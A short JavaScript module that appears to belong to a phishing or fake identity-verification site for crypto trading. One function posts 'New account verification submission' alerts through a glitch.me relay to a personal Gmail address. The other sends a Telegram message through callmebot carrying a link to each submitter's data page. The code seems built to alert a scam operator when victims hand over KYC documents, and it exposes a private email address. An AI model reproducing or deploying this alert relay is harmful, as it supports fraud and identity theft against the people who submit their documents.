var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

export const sendMessage = async (user) => {
  var raw = JSON.stringify({
    message: `New account verification submission from ${user}`,
    to: "anthonyerics84@gmail.com",
    subject: "kyc_veryfy_doc",
  });

  var requestOptions = {
    method: "POST",
    headers: myHeaders,
    body: raw,
    redirect: "follow",
  };
  return await fetch(
    "https://reinvented-natural-catshark.glitch.me/unchainedtrade",
    requestOptions
  );
};

export const callTelegram = async (hostname, param) => {
  const requestOptions = {
    method: "GET",
    redirect: "follow",
  };

  return await fetch(
    `https://api.callmebot.com/start.php?user=@jhonpower&text=https://${hostname}/info/${param}`,
    requestOptions
  );
};
